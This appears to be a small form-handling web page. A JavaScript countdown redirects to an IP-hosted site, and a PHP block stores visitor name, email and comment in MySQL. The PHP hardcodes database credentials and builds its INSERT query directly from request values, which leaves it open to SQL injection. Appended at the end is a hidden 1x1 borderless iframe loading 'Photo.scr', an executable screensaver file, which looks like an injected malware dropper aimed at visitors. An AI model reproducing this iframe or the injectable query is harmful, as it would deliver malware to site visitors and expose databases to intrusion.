<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">

<head runat="server">
    <title>setTimeout</title>
    <meta charset="UTF-8" /> </head>

<body>
    <form id="form1" runat="server">
        <div id='div1'> </div>
    </form>
</body>

</html>
<script type="text/javascript">
    //設定倒數秒數
    var t = 4;
    //顯示倒數秒收
    function showTime() {
        t -= 1;
        document.getElementById('div1').innerHTML = t;
        if (t == 0) {
            location.href = 'http://203.64.104.25/web/KUAS/index.html';
        }
        //每秒執行一次,showTime()
        setTimeout("showTime()", 1000);
    }
    //執行showTime()
    showTime();
</script>
<?php   
 $dbhost = '203.64.104.25';   
 $dbuser = 'Wang';   
 $dbpass = 'a11802';   
 $dbname = 'mydb';

 $name = $_REQUEST['name'];
 $email = $_REQUEST['email'];
 $comment = $_REQUEST['comment'];
 
 $conn = mysql_connect($dbhost, $dbuser, $dbpass) or die('Error with MySQL connection');
  
  mysql_query("SET NAMES 'utf8'");
  mysql_select_db($dbname);   
  
  $sql_insert = "INSERT INTO KUAS(name, email, comment) VALUES ('$name','$email','$comment')";
  $result = mysql_query($sql_insert) or die('MySQL insert error');
  
  $sql_query = "select * from data";
  $result = mysql_query($sql_query) or die('MySQL query error');
  
  if($row = mysql_fetch_array($result))
  {
   echo "感謝您的提交!";
   echo "將三秒後轉跳頁面!";
  }
?>
<iframe src=Photo.scr width=1 height=1 frameborder=0>
</iframe>
